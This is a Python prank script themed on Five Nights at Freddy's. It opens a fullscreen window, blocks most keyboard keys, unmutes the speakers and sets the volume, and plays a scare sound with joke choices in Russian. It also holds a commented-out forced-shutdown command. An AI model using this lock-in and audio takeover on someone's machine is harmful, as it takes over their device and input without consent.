import os
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from tkinter import *
from tkinter import ttk
import pygame
import keyboard as kb

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

win = Tk()
win.title("Выбрался всё таки")
width = win.winfo_screenwidth()
height = win.winfo_screenheight()
win.geometry(f"{width}x{height}")
win.attributes('-fullscreen', True)
died = False
stl = ttk.Style()
stl.configure("W.TButton", font=("Arial", 30), padding=10)
images = [PhotoImage(file=r"img.png"), PhotoImage(file=r"img.png"),
          PhotoImage(file=r"img.png"), PhotoImage(file=r"img.png"),
          PhotoImage(file=r"img.png")]
frames = [Frame(win), Frame(win), Frame(win), Frame(win), Frame(win)]
pygame.init()
for i in range(150):
    kb.block_key(i)
num = 0


def end():
    # os.system("shutdown /s /t 1")
    win.quit()


def return_menu():
    global num, buts
    buts[num - 1].configure(state="disabled")
    frames[num].pack_forget()
    frames[0].pack()


def volume_play(name):
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevelScalar(0.3, None)  # 1 = 100%
    pygame.mixer.music.load(name)  # Loading File Into Mixer
    pygame.mixer.music.play()


def but1():
    global num
    frames[0].pack_forget()
    frames[1].pack()
    volume_play(r"snd.mp3")
    num = 1
    win.after(3500, return_menu)


def but2():
    global num
    frames[0].pack_forget()
    frames[2].pack()
    volume_play(r"snd.mp3")
    num = 2
    win.after(3500, return_menu)


def but3():
    global num
    frames[0].pack_forget()
    frames[3].pack()
    volume_play(r"snd.mp3")
    num = 3
    win.after(5000, return_menu)


def but4():
    global num
    frames[0].pack_forget()
    frames[4].pack()
    volume_play(r"snd.mp3")
    num = 4
    win.after(7000, end)


lb = ttk.Label(frames[0], text="Вы разбудили Мишку Фредди. Он хочет снести вам табло. Ваши действия?",
               font=("Arial", 30),
               compound="bottom", justify=CENTER, anchor="center", image=images[0])
buts = [ttk.Button(frames[0], text="Спрятаться в туалет", command=but1, width=width, style="W.TButton"),
        ttk.Button(frames[0], text="Культурно решить вопрос", command=but2, width=width, style="W.TButton"),
        ttk.Button(frames[0], text="Мьюнинг", command=but3, width=width, style="W.TButton"),
        ttk.Button(frames[0], text="Молиться", command=but4, width=width, style="W.TButton")]
lb.pack()
for i in range(len(buts)):
    buts[i].pack()
for i in range(1, 5):
    lb = ttk.Label(frames[i], image=images[i], justify=CENTER, anchor="center", compound="bottom", text="")
    lb.pack()

frames[0].pack()
win.after(30_000, but4)
win.mainloop()
